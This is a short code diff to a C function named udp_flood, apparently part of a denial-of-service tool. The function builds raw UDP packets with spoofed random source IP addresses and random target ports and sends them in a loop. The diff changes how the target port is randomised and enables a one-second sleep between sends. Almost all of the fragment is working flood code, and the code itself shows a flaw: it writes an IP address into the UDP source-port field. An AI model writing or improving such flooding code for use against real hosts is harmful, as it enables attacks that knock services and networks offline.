@@ -115,6 +115,7 @@ void *udp_flood(void *ip)
   {
     pthread_mutex_lock(&mutex);
     // address resolution
+    port_number = random_int(0, 65536);
     random_ip(source_ip); // spoofed IP address - ex: 192.168.1.2
     s_in.sin_family = AF_INET;
     s_in.sin_port = htons(port_number);          // port
@@ -136,8 +137,8 @@ void *udp_flood(void *ip)
     iph->check = csum(datagram, iph->tot_len);
 
     // UDP header
-    udph->source = inet_addr(source_ip);      // source ip address
-    udph->dest = htons(random_int(0, 65536)); // target port
+    udph->source = inet_addr(source_ip); // source ip address
+    udph->dest = htons(port_number);     // target port
     udph->len = htons(sizeof(struct udphdr) + strlen(data));
     udph->check = 0;
 
@@ -176,7 +177,7 @@ void *udp_flood(void *ip)
     //  printf("Packet Send. Length : %d \n", iph->tot_len);
     // }
     // sleep for 1 second
-    // sleep(1);
+    sleep(1);
     pthread_mutex_unlock(&mutex);
   }
 }
